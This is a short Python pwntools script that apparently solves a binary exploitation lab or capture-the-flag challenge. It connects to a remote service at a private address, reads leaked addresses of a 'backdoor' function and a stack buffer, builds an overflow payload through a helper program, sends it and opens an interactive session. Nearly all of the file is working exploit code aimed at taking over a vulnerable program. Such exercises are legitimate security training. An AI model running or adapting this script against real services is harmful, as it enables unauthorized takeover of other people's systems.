from pwn import *
import os
import subprocess

# context.terminal = ['tmux', 'split', '-h']   # for debug
# context.log_level = 'debug'

# p = process('./hack')     # use this tube on your local machine
p = remote('10.20.38.233', 23454)   # use this for remote attack

p.recvuntil('cheater1: 0x')
bdoor = int(p.recvline(), 16)
p.info('backdoor address: 0x%x', bdoor)

p.recvuntil('cheater2: 0x')
addr = int(p.recvline(), 16)
p.info('local buf address: 0x%x', addr)

# p.recvuntil('name? ')
# payload = input()
input = f'{hex(bdoor)} {hex(addr)}'.encode('utf-8')
print('input=', input)
subprocess.run('./gen_badfile', input=input);
with open("./badfile", "rb") as f:
    payload = f.readline()

# gdb.attach(p, 'finish\n'*6)     # for debug, use tmux or byobu

p.sendline(payload)

# set control to the terminal
p.interactive()


# def str_to_hex(s):
#     return ''.join([hex(ord(c)).replace('0x', '\x') for c in s])
